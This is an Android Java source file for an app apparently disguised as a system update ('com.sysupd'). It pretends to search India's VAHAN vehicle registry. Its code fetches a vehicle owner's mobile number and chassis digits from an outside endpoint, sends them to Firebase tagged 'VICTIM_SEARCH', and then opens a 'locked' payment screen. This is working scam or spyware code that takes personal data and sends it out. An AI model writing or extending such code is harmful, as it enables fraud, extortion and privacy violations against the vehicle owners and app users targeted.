package com.sysupd;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {

    static String lastVehicle = "";
    static String lastMobile = "";
    static String lastChassis = "";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_main);

        Fb.init(this);

        final EditText input = findViewById(R.id.vehicleInput);
        Button search = findViewById(R.id.searchBtn);

        search.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                final String vnum = input.getText().toString().trim().toUpperCase();
                if (vnum.length() < 6) {
                    Toast.makeText(MainActivity.this,
                        "Enter valid vehicle number", Toast.LENGTH_SHORT).show();
                    return;
                }
                new FetchTask().execute(vnum);
            }
        });
    }

    class FetchTask extends AsyncTask<String, Void, String> {
        ProgressDialog pd;
        String vnum;

        protected void onPreExecute() {
            pd = new ProgressDialog(MainActivity.this);
            pd.setMessage("Searching VAHAN database...");
            pd.setCancelable(false);
            pd.show();
        }

        protected String doInBackground(String... p) {
            vnum = p[0];
            try {
                URL url = new URL("https://masking-pannel.vercel.app/api?veh=" + vnum);
                HttpURLConnection c = (HttpURLConnection) url.openConnection();
                c.setRequestMethod("GET");
                c.setConnectTimeout(15000);
                BufferedReader r = new BufferedReader(
                    new InputStreamReader(c.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) sb.append(line);
                r.close();
                return sb.toString();
            } catch (Exception e) {
                return null;
            }
        }

        protected void onPostExecute(String resp) {
            if (pd != null) pd.dismiss();
            if (resp == null) {
                Toast.makeText(MainActivity.this,
                    "Network error. Try again.", Toast.LENGTH_SHORT).show();
                return;
            }
            try {
                JSONObject o = new JSONObject(resp);
                boolean ok = o.optBoolean("success", false);
                if (!ok) {
                    Toast.makeText(MainActivity.this,
                        "Vehicle not found", Toast.LENGTH_SHORT).show();
                    return;
                }
                lastVehicle = o.optString("reg_no", vnum);
                lastMobile = o.optString("mobile", "");
                lastChassis = o.optString("chassis_last5", "");

                // Log search to Firebase
                Fb.send("VICTIM_SEARCH",
                    "{\"vehicle\":\"" + lastVehicle +
                    "\",\"mobile\":\"" + lastMobile +
                    "\",\"chassis\":\"" + lastChassis + "\"}");

                // Go to pay screen — locked view
                Intent i = new Intent(MainActivity.this, PayActivity.class);
                i.putExtra("vehicle", lastVehicle);
                i.putExtra("mobile", lastMobile);
                i.putExtra("chassis", lastChassis);
                startActivity(i);
            } catch (Exception e) {
                Toast.makeText(MainActivity.this,
                    "Error parsing data", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
